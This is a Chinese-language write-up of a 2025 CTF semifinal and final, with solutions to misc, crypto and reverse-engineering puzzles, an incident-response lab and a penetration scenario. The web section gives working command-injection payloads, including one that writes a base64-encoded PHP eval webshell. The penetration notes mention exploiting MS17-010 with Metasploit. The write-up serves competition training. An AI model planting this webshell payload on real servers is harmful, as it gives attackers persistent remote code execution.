# 2025御网杯【本科组】线下半决赛CTF+总决赛应急响应综合渗透WriteUp

> 原文: https://www.ctfiot.com/267352.html
> ID: 267352

2025御网杯半决赛WP

misc

键盘流量

执行成功。结果如下：
iloveyou<DEL><DEL><DEL><DEL><DEL><DEL><DEL><DEL>flag{}inKJ<DEL><DEL>op97ya<DEL><DEL>bc6g9
处理后的结果如下：
flag{}inop97bc6g9
删除的字符如下:
iloveyouKJya

flag值

flag{inop97bc6g9}

文件隐写

爆破压缩包密码

得到密码为：882401，解压出来一个文档，打开文档，点击左上角工具栏的清除格式即可获得flag。

得到：

flag值：

flag{12axzaq1sz}

第三题

打开题目附件，发现有一个exe文件，查看16进制发现是一个压缩包。修改后缀解压出一个流量包。直接全局搜索关键字flag以及flag的基本编码，得到：666c61677b44477377546667793147443233366673327366463264736b4c6e677d

hex解一下即可得到flag

flag值：

flag{DGswTfgy1GD236fs2sfF2dskLng}

第四题

工业流量分析

按照时间排序，最先STOP的包

flag值：

flag{ac6417423bb3000c}

crypto

第一题

题目附件：

0k4o 0k46 0k4p 0k54 0k51 0k33 0k33 0k43 0k4o 0k35 0k53 0k45 0k53 0k56 0k32 0k56 0k49 0k45 0k33 0k55 0k59 0k52 0k4o 0k32 0k49 0k52 0k52 0k44 0k41 0k4r 0k42 0k57 0k4o 0k46 0k4p 0k46 0k45 0k51 0k32 0k58 0k49 0k35 0k45 0k58 0k51 0k55 0k52 0k52 0k4o 0k5n 0k52 0k55 0k34 0k57 0k44 0k50 0k48 0k55 0k3q 0k3q 0k3q 0k3q 0k3q 0k3q

rot13转成hex

base混合解码即可得到flag。

Base混合多重解码:
[解码3次] Base32 -> Base64 -> Ascii85
混合解码结果:flag{hnctfqwer54321}

flag值：

flag{hnctfqwer54321}

第二题

压缩包文件为：

解压这个文件夹.zip
这是一张图片.png

解压这个文件夹.zip有密码，那就先对png图片进行分析。查看16进制，一眼就发现了问题，png文件头89 50 4E被修改成了00 50 4E，改回来即可打开，得到解压密码： ctf@welcome。再次解压出一个图片flag.jpg，在图片属性中发现一串base64，解一下即可获得flag，ctf_you_passed。

flag值：

flag{ctf_you_passed}

第三题

提示有在纸的背面写着62，那么猜测就是先将字符串给反过来排一下，然后再进行base62解码。

第四题

from secret import init1,init2,init3,FLAG
import hashlib
assert(FLAG=="flag{"+hashlib.sha256(init1+init2+init3).hexdigest()+"}")

classlfsr():
    def__init__(self, init, mask, length):
        self.init = init
        self.mask = mask
        self.lengthmask = 2**(length+1)-1

    defnext(self):
        nextdata = (self.init << 1) & self.lengthmask 
        i = self.init & self.mask & self.lengthmask 
        output = 0
        while i != 0:
            output ^= (i & 1)
            i = i >> 1
        nextdata ^= output
        self.init = nextdata
        return output

defcombine(x1,x2,x3):
    return (x1*x2)^(x2*x3)^(x1*x3)

if __name__=="__main__":
    l1 = lfsr(int.from_bytes(init1,"big"),0b100000000000000000000000010000000000000000000000,48)
    l2 = lfsr(int.from_bytes(init2,"big"),0b100000000000000000000000000000000010000000000000,48)
    l3 = lfsr(int.from_bytes(init3,"big"),0b100000100000000000000000000000000000000000000000,48)

    withopen("keystream","wb") as f:
        for i inrange(8192):
            b = 0
            for j inrange(8):
                b = (b<<1)+combine(l1.next(),l2.next(),l3.next())
            f.write(chr(b).encode())

[De1CTF2019]Babylfsr：Writeup for Crypto Problems in De1CTF 2019 | Soreat_u’s Blog

https://blog.soreatu.com/posts/writeup-for-crypto-problems-in-de1ctf-2019/#babylfsr

Re

re_c5

找到关键代码：

if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespacen");
        if(unshare(CLONE_NEWUSER) = 0)
            fprintf(stderr, "102 108 97 103 123 72 78 67 84 70 109 110 103 49 50 51 125 n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespacen");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return0;
    }

对加密数据进行解密即可

102 108 97 103 123 72 78 67 84 70 109 110 103 49 50 51 125
From_Decimal-->flag{HNCTFmng123}

flag值：

flag{HNCTFmng123}

re_python

将pyre.exe文件转成pyc文件，打开发现一个命名非常可疑的文件1.pyc，继续将pyc文件反编译为python文件，得到：

def check():
    a = input('plz input your flag:')
    c = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]
    iflen(a) != 42:
        print('wrong length')
        return0
    b = None
    for i inrange(len(a)):
        iford(a[i]) * 33 % b != c[i]:
            print('wrong')
            returnNone
    
    print('win')

check()

其中，关键代码为：

if len(a) != 42:
ord(a[i]) * 33 % b != c[i]:

判断flag长度是否为42为，然后对c进行下列操作ord(a[i]) * 33 % b != c[i]:

计算扩展欧几里得算法，返回 (g, x, y) 使得 ax + by = g = gcd(a, b)

脚本一

import math

defextended_gcd(a, b):
    """ 计算扩展欧几里得算法，返回 (g, x, y) 使得 a*x + b*y = g = gcd(a, b) """
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)

defmodinv(a, m):
    """ 计算 a 在模 m 下的乘法逆元 """
    g, x, y = extended_gcd(a, m)
    if g != 1:
        returnNone# 逆元不存在
    else:
        return x % m

c = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]

for b inrange(2, 256):
    if math.gcd(33, b) != 1:
        continue
    
    inv = modinv(33, b)
    if inv isNone:
        continue
    
    flag = []
    valid = True
    for num in c:
        x = (num * inv) % b
        if32 <= x <= 126:
            flag.append(chr(x))
        else:
            valid = False
            break
    
    if valid:
        flag_str = ''.join(flag)
        print(f"b = {b}, flag = {flag_str}")

# b = 118, flag = :7>;+WTTU9S>X[^8[6[Y766[6[9U[^Y7^:W[7U87>$
# b = 146, flag = TYPUe)../S-P*%(R-P%+QPP%P-S/%(+Q(T)-Q/RQPf
# b = 151, flag = IENJ6okklHjNptwGsEtqFEEtEsHltwqFwIosFlGFN.
# b = 179, flag = flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}

脚本二

import math

deffind_a(res, b):
    g = math.gcd(33, b)
    res % g != 0
    a_coeff = 33 // g
    mod = b // g
    rhs = res // g
    inv_a_coeff = pow(a_coeff, -1, mod)
    a = (rhs * inv_a_coeff) % mod
    return a

res = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]

withopen('1.txt', 'w') as f:
    for b inrange(2, 256):
        for i in res:
            f.write(str(find_a(i, b)) + ' ')
        f.write('n')

withopen('1.txt', 'r') as f:
    lines = f.readlines()
for line in lines:
    decimals = list(map(int, line.strip().split()))
    chars = ''.join([chr(d) for d in decimals if32 <= d <= 126])
    if'flag{'in chars:
        print(chars)
        break

# flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}

flag值：

flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}

Web

rce

方法一（打印编码的flag）

ip/?cmd=print(base64_encode(file_get_contents(base64_decode("ZmxhZy5waHA="))));

方法二（写入webshell）

直接写入一个webshell

file_put_contents(
    base64_decode("c2hlbGwucGhw"),  // "shell.php"
    base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==")  // "<?php @eval($_POST[x]); ?>"
);

进行编码后为：

ip/?cmd=file_put_contents(base64_decode("c2hlbGwucGhw"),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg=="));

应急响应

应急响应靶场：
某天客户反馈：服务器操作过一段时间就会非常卡，重启以后就会好一段时间并且重
要文件被加密破坏；请你按照下面相关提示完成应急响应帮助客户进行安全加固。
（服务器账号/密码 Administrator/Admin@qq.com）请尽可能详细的描述解题过
程并且附上关键步骤截图（截图必须带上时间）

第一题：

请你获取攻击者的 webshell 文件（提交如下例：abc.asp ）： //100

D盾扫描web目录，发现存在冰蝎马

答案：driver.php

第二题：

请你获取攻击者的 webshell 密码： //100

打开webshell即可找到

答案：hack1234

第三题：

请你获取攻击者的隐藏用户名： //100

计算机管理的账户中发现 hack887$

答案：hack887$

第四题：

根据内网信息排查，发现攻击者投放了恶意信息收集程序是并且定期执行，排查清
理恶意程序并且获取恶意信息收集软件名称（提交如下例：shell ）： //100

Windows Denfender保护记录发现，存在一个SharpHunter.exe

答案：SharpHunter.exe

第五题：

请你梳理攻击链路，分析攻击者是如何入侵攻击的（攻击方式英文字母全小写 提交
如下例：xxe 攻击）： //300

ftp 的 log 被删，结合突然出现的后门文件可以确定为通过 ftp 弱口令连接放马，同时找到了一个可疑的.bat 文件，有通过ftp上传文件的行为，固判断为ftp攻击

答案：ftp攻击

第六题：

请你恢复被病毒感染的文件获取到敏感信息 flag： //300

使用KasperskyRakhniDecryptor工具，修复flag.txt文件，获得flag。

原题链接：CTFhub–病毒文件恢复modbus协议分析注册表分析_ctfhub 简单modbus协议分析-CSDN博客(https://blog.csdn.net/it_wzb/article/details/133616226)

第七题：

请你对恶意样本（.bat 文件）进行分析获取恶意域名： //300

计划任务那里拿到 securty.bat 的执行路径，里面存在域名：pro.csocools.com

答案：pro.csocools.com

综合渗透

渗透一

完全仿真业务系统，企业场景包含不同类型虚拟机。在该综合场景下完全仿真相关的
系统业务考察内容丰富；考察参赛队伍的信息收集、外网打点、暴力破解、内网渗透、
SQL 注入、横向移动、内网提权等。

1.通过字典爆破然后获取普通用户权限得 flag //300

2.获取管理员权限得到 flag //300

3.目录扫描获取 flag //300

4.获得普通用户权限得到 flag //500

5.获得管理员权限得到 flag //500

全是蜜罐没打进去

渗透二

完全仿真业务系统，企业场景包含不同类型虚拟机。在该综合场景下完全仿真相关的
系统业务考察内容丰富；考察参赛队伍的信息收集、外网打点、经典漏洞、内网横向、
内网信息收集、内网提权等。

第一题

通过目录扫描获取 flag //100 

在flag.txt找到flag

答案：flag{HNZJS01qwaszx1m} 

第二题

通过获取管理员权限得到 flag //300 

MS17-010（Eternal blue永恒之蓝）漏洞，使用msf直接打

题目复现地址：https://gz.x1a0yu.top/games/11

获取题目附件以及web源码可后台私信。


```
执行成功。结果如下：
iloveyou<DEL><DEL><DEL><DEL><DEL><DEL><DEL><DEL>flag{}inKJ<DEL><DEL>op97ya<DEL><DEL>bc6g9
处理后的结果如下：
flag{}inop97bc6g9
删除的字符如下:
iloveyouKJya
```



```
flag{inop97bc6g9}
```



```
flag{12axzaq1sz}
```



```
flag{DGswTfgy1GD236fs2sfF2dskLng}
```



```
flag{ac6417423bb3000c}
```



```
0k4o 0k46 0k4p 0k54 0k51 0k33 0k33 0k43 0k4o 0k35 0k53 0k45 0k53 0k56 0k32 0k56 0k49 0k45 0k33 0k55 0k59 0k52 0k4o 0k32 0k49 0k52 0k52 0k44 0k41 0k4r 0k42 0k57 0k4o 0k46 0k4p 0k46 0k45 0k51 0k32 0k58 0k49 0k35 0k45 0k58 0k51 0k55 0k52 0k52 0k4o 0k5n 0k52 0k55 0k34 0k57 0k44 0k50 0k48 0k55 0k3q 0k3q 0k3q 0k3q 0k3q 0k3q
```



```
Base混合多重解码:
[解码3次] Base32 -> Base64 -> Ascii85
混合解码结果:flag{hnctfqwer54321}
```



```
flag{hnctfqwer54321}
```



```
解压这个文件夹.zip
这是一张图片.png
```



```
flag{ctf_you_passed}
```



```
from secret import init1,init2,init3,FLAG
import hashlib
assert(FLAG=="flag{"+hashlib.sha256(init1+init2+init3).hexdigest()+"}")

classlfsr():
    def__init__(self, init, mask, length):
        self.init = init
        self.mask = mask
        self.lengthmask = 2**(length+1)-1

    defnext(self):
        nextdata = (self.init << 1) & self.lengthmask 
        i = self.init & self.mask & self.lengthmask 
        output = 0
        while i != 0:
            output ^= (i & 1)
            i = i >> 1
        nextdata ^= output
        self.init = nextdata
        return output

defcombine(x1,x2,x3):
    return (x1*x2)^(x2*x3)^(x1*x3)

if __name__=="__main__":
    l1 = lfsr(int.from_bytes(init1,"big"),0b100000000000000000000000010000000000000000000000,48)
    l2 = lfsr(int.from_bytes(init2,"big"),0b100000000000000000000000000000000010000000000000,48)
    l3 = lfsr(int.from_bytes(init3,"big"),0b100000100000000000000000000000000000000000000000,48)

    withopen("keystream","wb") as f:
        for i inrange(8192):
            b = 0
            for j inrange(8):
                b = (b<<1)+combine(l1.next(),l2.next(),l3.next())
            f.write(chr(b).encode())
```



```
if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespacen");
        if(unshare(CLONE_NEWUSER) = 0)
            fprintf(stderr, "102 108 97 103 123 72 78 67 84 70 109 110 103 49 50 51 125 n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespacen");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return0;
    }
```



```
102 108 97 103 123 72 78 67 84 70 109 110 103 49 50 51 125
From_Decimal-->flag{HNCTFmng123}
```



```
flag{HNCTFmng123}
```



```
def check():
    a = input('plz input your flag:')
    c = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]
    iflen(a) != 42:
        print('wrong length')
        return0
    b = None
    for i inrange(len(a)):
        iford(a[i]) * 33 % b != c[i]:
            print('wrong')
            returnNone
    
    print('win')

check()
```



```
if len(a) != 42:
ord(a[i]) * 33 % b != c[i]:
```



```
import math

defextended_gcd(a, b):
    """ 计算扩展欧几里得算法，返回 (g, x, y) 使得 a*x + b*y = g = gcd(a, b) """
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = extended_gcd(b % a, a)
        return (g, x - (b // a) * y, y)

defmodinv(a, m):
    """ 计算 a 在模 m 下的乘法逆元 """
    g, x, y = extended_gcd(a, m)
    if g != 1:
        returnNone# 逆元不存在
    else:
        return x % m

c = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]

for b inrange(2, 256):
    if math.gcd(33, b) != 1:
        continue
    
    inv = modinv(33, b)
    if inv isNone:
        continue
    
    flag = []
    valid = True
    for num in c:
        x = (num * inv) % b
        if32 <= x <= 126:
            flag.append(chr(x))
        else:
            valid = False
            break
    
    if valid:
        flag_str = ''.join(flag)
        print(f"b = {b}, flag = {flag_str}")

# b = 118, flag = :7>;+WTTU9S>X[^8[6[Y766[6[9U[^Y7^:W[7U87>$
# b = 146, flag = TYPUe)../S-P*%(R-P%+QPP%P-S/%(+Q(T)-Q/RQPf
# b = 151, flag = IENJ6okklHjNptwGsEtqFEEtEsHltwqFwIosFlGFN.
# b = 179, flag = flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
```



```
import math

deffind_a(res, b):
    g = math.gcd(33, b)
    res % g != 0
    a_coeff = 33 // g
    mod = b // g
    rhs = res // g
    inv_a_coeff = pow(a_coeff, -1, mod)
    a = (rhs * inv_a_coeff) % mod
    return a

res = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]

withopen('1.txt', 'w') as f:
    for b inrange(2, 256):
        for i in res:
            f.write(str(find_a(i, b)) + ' ')
        f.write('n')

withopen('1.txt', 'r') as f:
    lines = f.readlines()
for line in lines:
    decimals = list(map(int, line.strip().split()))
    chars = ''.join([chr(d) for d in decimals if32 <= d <= 126])
    if'flag{'in chars:
        print(chars)
        break

# flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
```



```
flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
```



```
ip/?cmd=print(base64_encode(file_get_contents(base64_decode("ZmxhZy5waHA="))));
```



```
file_put_contents(
    base64_decode("c2hlbGwucGhw"),  // "shell.php"
    base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==")  // "<?php @eval($_POST[x]); ?>"
);
```



```
ip/?cmd=file_put_contents(base64_decode("c2hlbGwucGhw"),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg=="));
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391520-wxsync-2025-08-4f3c4dbb004c2eab39f2a5b5a0943ba9.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391522-wxsync-2025-08-67aab08b5b21ea207b878760882966f0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391523-wxsync-2025-08-cf1a5b7d16110cf68235bd605ad67aa8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391525-wxsync-2025-08-76cea818557336c3ef8854b214068fe5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391528-wxsync-2025-08-1ae8a73cf37b1e0e4e653f33600ace45.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391529-wxsync-2025-08-f2a5d4c1c8b300e9d208a5ea26733ad4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391531-wxsync-2025-08-1ae8a73cf37b1e0e4e653f33600ace45.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391533-wxsync-2025-08-7629ea963c95a50f20f91670876394a4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391535-wxsync-2025-08-ea7048154695798e51eae898ccf8d11b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1756391536-wxsync-2025-08-7e31743bb981e806d55a38ad4de219a8.png)